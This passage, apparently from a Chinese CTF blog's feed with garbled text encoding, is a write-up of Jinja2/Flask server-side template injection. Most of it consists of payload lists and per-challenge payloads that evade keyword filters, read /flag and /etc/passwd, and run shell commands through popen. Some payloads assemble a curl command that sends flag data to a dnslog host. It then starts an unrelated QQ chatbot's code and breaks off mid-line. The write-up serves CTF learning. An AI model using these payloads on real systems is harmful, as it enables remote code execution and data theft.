href="#Flaskçš„ä¸€äº›å…¨å±€å˜é‡-amp-amp-å…³é”®å­—" class="headerlink" title="Flaskçš„ä¸€äº›å…¨å±€å˜é‡ &amp;&amp; å…³é”®å­—"></a><strong>Flaskçš„ä¸€äº›å…¨å±€å˜é‡ &amp;&amp; å…³é”®å­—</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>requests<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>requests<span class="token punctuation">.</span>environ<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>self<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>get_flashed_messages<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h3><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&#x2F;&#x2F;æƒ³è¦è·å–å‘½ä»¤æ‰§è¡Œç»“æœå¯ä»¥åœ¨åé¢åŠ ä¸Š.read()&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read() -------------------------------- &gt;&gt;&gt;object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read() --------------------------------&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[200](&#39;calc&#39;) &#125;&#125;å…¶ä¸­çš„xxxxå¯ä»¥ä¸ºä»»æ„å­—ç¬¦&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;) &#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(&quot;__import__(&#39;os&#39;).popen(&#39;calc&#39;).read()&quot;) &#125;&#125; #æœ¬åœ°æµ‹è¯•ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰§è¡Œwhoamiåªä¼šè¿”å›None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://dar1in9s.github.io/2020/09/15/ssti%E8%BF%9B%E9%98%B6/">æ‹“å±•</a></p><h3 id="16è¿›åˆ¶ç»•è¿‡"><a href="#16è¿›åˆ¶ç»•è¿‡" class="headerlink" title="16è¿›åˆ¶ç»•è¿‡"></a>16è¿›åˆ¶ç»•è¿‡</h3><p>å¯ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡å…³é”®å­—ç¬¦</p><pre class="line-numbers language-none"><code class="language-none">\x5f _<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯»æ‰¾å¯ç”¨ç±»è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jsona <span class="token operator">=</span> <span class="token triple-quoted-string string">""""""</span>num <span class="token operator">=</span> <span class="token number">0</span>allList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">">"</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> i        allList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token string">"\n"</span> <span class="token keyword">or</span> i <span class="token operator">==</span> <span class="token string">","</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> i<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>allList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"os._wrap_close"</span> <span class="token keyword">in</span> v<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> v<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é™¤äº†pythonä¹‹å¤–çš„SSTI"><a href="#é™¤äº†pythonä¹‹å¤–çš„SSTI" class="headerlink" title="é™¤äº†pythonä¹‹å¤–çš„SSTI"></a><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">é™¤äº†pythonä¹‹å¤–çš„SSTI</a></h4><p><strong>361</strong></p><p>æ— è¿‡æ»¤ï¼Œå‚æ•°åä¸ºnameï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;tac &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>362</strong></p><p>è¿‡æ»¤äº†æ•°å­—ï¼Œä½¿ç”¨å…¨è§’æ•°å­—ä»£æ›¿æ­£å¸¸æ•°å­—</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[ï¼‘ï¼“ï¼’].__init__.__globals__[&#39;popen&#39;](&#39;tac &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>363</strong></p><p>è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œå¯é€šè¿‡request.argsä¼ å…¥æ–°å‚æ•°è§£å†³ï¼Œæˆ–è€…ä½¿ç”¨chræ¥ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;request.argspayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a&#x3D;os&amp;b&#x3D;popen&amp;c&#x3D;tac &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;chrpayload:?name&#x3D;&#123;% set chr&#x3D;url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>364</strong></p><p>è¿‡æ»¤äº†argsï¼Œæ— æ³•ä½¿ç”¨GETä¼ å‚äº†ï¼Œä½¿ç”¨<del>POSTï¼ˆæ–¹æ³•è¢«ç¦ç”¨äº†ï¼‰</del>æˆ–è€…cookieéƒ½å¯</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;cookiepayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;Cookie: a&#x3D;os;b&#x3D;popen;c&#x3D;tac &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;chrpayload:?name&#x3D;&#123;% set chr&#x3D;url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>365</strong></p><p>è¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œæ¢ç‚¹</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;cookiepayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()&#125;&#125;Cookie: a&#x3D;tac &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>366</strong></p><p>è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œç”¨attræ–¹æ³•ï¼šrequest|attr(request.cookies.a)ç­‰ä»·äºrequest[â€œaâ€]</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()&#125;&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»–äººWP</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;Cookie: a&#x3D;__globals__;b&#x3D;cat &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>367</strong></p><p>è¿‡æ»¤äº†osï¼Œç»§ç»­ç”¨attr</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()&#125;&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag; e&#x3D;os;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>368</strong></p><p>è¿‡æ»¤äº†{undefined{undefinedï¼Œä½¿ç”¨å‘½ä»¤æ–¹å¼print</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag; e&#x3D;os;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>369</strong></p><p>è¿‡æ»¤äº†requestï¼Œæ²¡åŠæ³•ä¼ é€’å‚é‡äº†ï¼Œä½¿ç”¨æ¨¡ç‰ˆè¿‡æ»¤å™¨</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#x2F;&#x2F;æ„é€ popï¼Œä¸ºä¸‹æ–¹æä¾›_&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#x2F;&#x2F;æ„é€ å‡º_&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;æ„é€ å‡º__init__&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;æ„é€ å‡º__globals__&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;æ„é€ å‡º__getitem__&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;æ„é€ å‡º__builtins__&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#x2F;&#x2F;æ„é€ å‡ºbuiltinsæ¨¡å—&#123;% set chr&#x3D;x.chr%&#125;&#x2F;&#x2F;ä½¿ç”¨chrå‡½æ•°&#123;% set file&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#x2F;&#x2F;æ„é€ å‡ºå­—ç¬¦ä¸²&#x2F;flag&#123;%print(x.open(file).read())%&#125;&#x2F;&#x2F;è¯»æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>370</strong></p><p>è¿‡æ»¤æ•°å­—ç”¨å…¨è§’ï¼Œæˆ–è€…ä½¿ç”¨lengthï¼Œcountæ„é€ æ•°å­—</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(ï¼’ï¼”)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%&#125;&#123;%print(x.open(file).read())%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>371</strong></p><p>printå›æ˜¾è¢«ç¦ï¼Œdnslogå¤–å¸¦</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set po&#x3D;(dict(po&#x3D;a,p&#x3D;a)|join)%&#125;&#123;% set ershisi&#x3D;(dict(eeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length)%&#125;&#123;% set xiahuaxian&#x3D;(()|select|string|list)|attr(po)(ershisi)%&#125;&#123;% set ur&#x3D;((dict(ur&#x3D;a,l&#x3D;a)|join,xiahuaxian,dict(fo&#x3D;a,r&#x3D;a)|join)|join)%&#125;&#123;% set glo&#x3D;((xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join)%&#125;&#123;% set ous&#x3D;(dict(o&#x3D;a,s&#x3D;a)|join)%&#125;&#123;% set ouuu&#x3D;(ur|attr(glo)|attr(ous))%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|length%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(czducq&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>372</strong></p><p>countæ¢æˆlength</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|length%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(czducq&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½—ä¼¯ç‰¹</title>
      <link href="/posts/61106.html"/>
      <url>/posts/61106.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#bot.py</span><span class="token keyword">from</span> unittest<span class="token punctuation">.</span>mock <span class="token keyword">import</span> NonCallableMagicMock<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> requests<span class="token keyword">import</span> apiapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''ç›‘å¬ç«¯å£ï¼Œè·å–QQä¿¡æ¯'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">'ä¸‹é¢çš„request.get_json().get......æ˜¯ç”¨æ¥è·å–å…³é”®å­—çš„å€¼ç”¨çš„ï¼Œå…³é”®å­—å‚è€ƒä¸Šé¢ä»£ç æ®µçš„æ•°æ®æ ¼å¼'</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message_type'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'private'</span><span class="token punctuation">:</span>        uid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_id'</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'raw_message'</span><span class="token punctuation">)</span>        api<span class="token punctuation">.</span>keywordForPerson<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message_type'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'group'</span><span class="token punctuation">:</span>        gid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'group_id'</span><span class="token punctuation">)</span>        uid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_id'</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'raw_message'</span><span class="token punctuation">)</span>        nick<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nickname'</span><span class="token punctuation">)</span>        role<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span>        api<span class="token punctuation">.</span>keywordForGroup<span class="token punctuation">(</span>message<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> uid<span class="token punctuation">,</span>nick<span class="token punctuation">,</span>role<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'OK'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5701</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#api.py</span><span class="token keyword">import</span> person<span class="token keyword">import</span> group<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">import</span> json<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"å¤©æ°”ï¼šè¾“å…¥å¤©æ°” åœ°åï¼Œè·å–å½“åœ°å¤©æ°”ï¼Œé»˜è®¤ä¸ºå¾å·å¤©æ°”\nåŒè‰²çƒï¼šè¾“å…¥åŒè‰²çƒæŸ¥çœ‹æœ€æ–°ä¸€æœŸåŒè‰²çƒå¼€å¥–ä¿¡æ¯ä»¥åŠå¥–æ± ç´¯è®¡é‡‘é¢\næ‰”ç“¶å­ï¼šç§èŠç½—ä¼¯ç‰¹å¹¶å‘é€ä»¥ä¸‹å†…å®¹ï¼š\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ 